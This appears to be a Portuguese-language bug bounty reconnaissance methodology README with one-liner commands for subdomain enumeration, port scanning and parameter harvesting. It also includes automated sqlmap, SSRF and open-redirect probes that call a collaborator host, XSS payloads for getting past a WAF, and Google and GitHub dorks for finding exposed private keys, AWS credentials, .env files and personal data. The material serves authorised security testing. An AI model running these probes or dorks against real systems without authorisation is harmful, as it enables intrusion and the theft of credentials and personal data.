<h1 align="center">「📚」Minha metodologia de reconhecimento</h1>

<p align="center"><img src="map.png"></img></p>

<p align="center">Olá visitante, este repositório foi criado para mostrar minha metodologia de recon que sigo para obter informações sobre um alvo. Espero ter ajudado.</p>

# Ferramentas citadas:

* </p><a href="https://github.com/tomnomnom/assetfinder">Assetfinder</a></p>
* </p><a href="https://censys.io/">Censys</a></p>
* </p><a href="https://github.com/003random/getJS">GetJS</a></p>
* </p><a href="https://github.com/tomnomnom/hacks/tree/master/html-tool">HTML-Tool</a></p>
* </p><a href="https://github.com/GerbenJavado/LinkFinder">LinkFinder</a></p>
* </p><a href="https://github.com/robertdavidgraham/masscan">Masscan</a></p>
* </p><a href="https://github.com/MrEmpy/metafind">Metafind</a></p>
* </p><a href="https://github.com/nmap/nmap">Nmap</a></p>
* </p><a href="https://github.com/RustScan/RustScan">Rustscan</a></p>
* </p><a href="https://github.com/projectdiscovery/subfinder">Subfinder</a></p>
* </p><a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a></p>
* </p><a href="http://viewdns.info/">ViewDNS</a></p> 
* </p><a href="https://github.com/EnableSecurity/wafw00f">Wafw00f</a></p> 
* </p><a href="https://github.com/tomnomnom/waybackurls">Waybackurls</a></p> 
* </p><a href="https://github.com/urbanadventurer/WhatWeb">WhatWeb</a></p> 
* </p><a href="https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?hl=pt-BR">Wappalyzer</a></p>

# Subdomínios:

Primeiramente eu começo extraindo subdomínios do alvo, algumas ferramentas que eu uso são ```sublist3r```, ```subfinder```, ```assetfinder```, eu uso shodan e censys para pesquisar mais profundidades mais tarde para extrair algumas informações.

Eu tenho alguns comandos em uma linha para extrair subdomínios e verificar se eles estão vivos:

```
$ cat domains.txt | assetfinder -subs-only | httpx -silent | awk -F[/:] '{print $4}' | tee -a subdomains.txt

$ sublist3r -d scope.com -o extracted_subdomains.txt;cat extracted_subdomains.txt | httpx -silent -o verified_subdomains.txt;cat verified_subdomains.txt | awk -F[/:] '{print $4}' | anew > subdomains.txt;rm verified_subdomains.txt extracted_subdomains.txt

$ subfinder -dL domains.txt -o a;cat a | httpx -silent | awk -F[/:] '{print $4}' | luck -u | tee -a subdomains.txt;rm a
```

* <a href="https://github.com/MrEmpy/BugBountyTricks">Mais sobre o assunto</a>

# Varredura de Porta:

Descobrir quais portas estão abertas em um servidor de destino é uma das minhas principais tarefas durante o reconhecimento. Ferramentas que eu uso para escanear portas são ```nmap```, ```masscan```, ```rustscan```, eu costumo deixar ```nmap``` por último porque eu prefiro uma ferramenta mais rápida como ```masscan``` e ```rustscan```. Se houver muitos hosts eu prefiro usar ```masscan``` do que ```rustscan```.

Alguns comandos que uso:

```
$ SCOPE=192.168.0.0/24;RPORT=22,80,443;rustscan -b 500 -a $SCOPE -p $RPORT | grep "Open $SCOPE[0-9]*" | tee -a ports.txt

$ masscan -p1-65535 -iL ips.txt --max-rate 100000 -oG ports.txt

$ nmap 192.168.0.0/24 -sV -T4 -sC
```

* <a href="https://github.com/MrEmpy/BugBountyTricks">Mais sobre o assunto</a>

# Parâmetros:

Obter URLs com parâmetros é fundamental para análises futuras e também automatizar a busca de vulnerabilidades neles, costumo extraí-los com a ferramenta ```waybackurls``` e deixar comandos rodando em segundo plano para encontrar vulnerabilidades como XSS, SSRF, SQLI , Abrir Redirecionamento.

Algumas combinações de ferramentas que utilizo durante a análise de vulnerabilidades:

```
$ cat subdomains.txt | waybackurls | sed -e 's/:80//' | grep "?[a-z0-9]*=" | tee -a parameters.txt

$ cat parameters.txt | gf xss > xss_parameters.txt;dalfox file xss_parameters.txt --skip-bav -o dalfox.txt

$ cat parameters.txt | grep "?[a-z0-9]*=" | gf sqli | sqlmap --risk 3 --batch --dbs

$ for x in $(cat domains.txt | assetfinder -subs-only | httpx -silent);do echo "$x//<BURP SUITE COLLABORATOR OR NGROK>/%2F.." | httpx -silent -follow-redirects;done

$ cat subdomains.txt | waybackurls | gf ssrf | qsreplace <http://BURP SUITE COLLABORATOR OR NGROK> | httpx -silent -follow-redirects

$ cat subdomains.txt | waybackurls | gf redirect | qsreplace <http://BURP SUITE COLLABORATOR OR NGROK> | httpx -silent -follow-redirects
```

* <a href="https://github.com/MrEmpy/BugBountyTricks">Mais sobre o assunto</a>

# Tecnologias:

Extrair tecnologias de um alvo é essencial para conhecer o funcionamento de um determinado alvo, algumas dessas tecnologias tiveram falhas encontradas por pesquisadores de segurança, tanto críticas quanto de baixo nível. Precisamos conhecer as tecnologias do alvo para saber lidar com aquele cenário de exploração. Algumas ferramentas que uso são ```wappalyzer``` e ```whatweb```, guardo as informações para análise futura ao testar a segurança de um alvo.

# Captura de tela:

A captura de tela ajuda muito na hora de conhecer a casa de um alvo, principalmente quando há muitos hosts ativos, com ela consigo ter uma ideia do que cada servidor é utilizado e facilita ver o que fazer manualmente de host por host.
Nas capturas de tela eu procuro hosts com página de login, acesso negado (401/403), sites com mais aplicativos, isso aplica seu campo para selecionar um dos hosts para começar a procurar por vulnerabilidades.

```
$ assetfinder -subs-only scope.com | httpx -silent -o verified_subdomains.txt;cat verified_subdomains.txt | awk -F[/:] '{print $4}' | anew > subdomains.txt;rm verified_subdomains.txt;eyewitness -f subdomains.txt --prepend-https -d screenshots
```

# WAF:

Alguns servidores utilizam Web Application Firewall (WAF) para proteger seus sites contra ataques maliciosos como injeção de código, é importante identificá-los e saber como contorná-los. Eu uso ```wafw00f``` para identificar qual WAF está sendo usado em um determinado host. Para encontrar o endereço IP de um alvo eu costumo usar ```censys``` e ```viewdns```.

Alguma carga útil para contornar o WAF:

```
<sCrIpt>alert(1)</ScRipt>
<script x>
<script x>alert('XSS')<script y>
<img src='1' onerror='alert(0)' <
String.fromCharCode(88,83,83)
<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
<script>window['alert'](document['domain'])</script>
"><svg/onload=confirm(1)>"@x.y
```

Algumas referências sobre como contornar um WAF:

* <a href="https://hacken.io/researches-and-investigations/how-to-bypass-waf-hackenproof-cheat-sheet/">Como ignorar o WAF - Folha de dicas</a>
* <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#filter-bypass-and-exotic-payloads">WAF de desvio XSS</a>


# Arquivos:

Alguns arquivos podem ser interessantes para obter mais informações sobre o alvo, alguns scripts podem conter informações valiosas que podem desencadear uma falha como injeção de código ou até mesmo divulgação de informações confidenciais.

Arquivos Javascript Eu costumo usar ferramentas ```linkfinder```, ```waybackurls```, ```getjs``` para pesquisar endpoints, subdomínios, informações confidenciais.

Arquivos PDF Eu uso a ferramenta ```metafind``` para encontrar não apenas arquivos PDF, mas também arquivos XLS, TXT, DOCX, XLSX. Uma boa pesquisa usando o Google Dorks também é eficaz.

Arquivos HTML Eu uso a ferramenta ```html-tools``` para extrair partes do código HTML como comentários, endpoints, subdomínios.

Arquivos JSON Eu uso a ferramenta ```waybackurls``` para encontrá-los e procurar informações importantes.

```
$ assetfinder -subs-only scope.com | httpx -silent | html-tool comments

$ cat subdomains.txt | waybackurls | grep "\\.json" | anew | tee -a json.txt

$ cat subdomains.txt | getJS --complete | anew | tee -a js.txt

$ metafind -d target.com -o files
```

Google Dorks:

```
site:*.scope.com ext:pdf intext:"name" intext:"email" intext:"phone" intext:"address"
site:*.scope.com ext:pdf intext:"name" intext:"email" intext:"<@domain.com>" intext:"phone" intext:"address"
site:*.scope.com ext:pdf intext:"name" intext:"email" intext:"phone" intext:"city" intext:"state" intext:"zipcode"
site:groups.google com "<TARGET>"
site:*.scope.com ext:sql
site:*.scope.com ext:env
site:*.scope.com ext:txt
site:*.scope.com ext:sql intext:"Dumping data for table `users`" | `password` | `name`
site:*.scope.com ext:txt intext:"<@domain.com>" intext:email intext:password
```

* <a href="https://github.com/MrEmpy/BugBountyTricks">Mais sobre o assunto</a>

# Github:

Muitas empresas postam seus projetos no Github e acabam deixando vazar algumas informações confidenciais como uma chave de API. Por esse motivo, alguns pesquisadores de segurança usam o Github Dorks para encontrar essas informações facilmente.

Uma boa ferramenta para automatizar essa busca é usar a ferramenta ```github-dorks```.

Alguns idiotas:

```
filename:id_rsa or filename:id_dsa
extension:sql mysql dump
extension:sql mysql dump password
filename:credentials aws_access_key_id
filename:.s3cfg
filename:wp-config.php
filename:.htpasswd
filename:.env DB_USERNAME NOT homestead
filename:.env MAIL_HOST=smtp.gmail.com
filename:.git-credentials
PT_TOKEN language:bash
filename:.bashrc password
filename:.bashrc mailchimp
filename:.bash_profile aws
rds.amazonaws.com password
extension:json api.forecast.io
extension:json mongolab.com
```

* <a href="https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt">Lista Github Dorks</a>
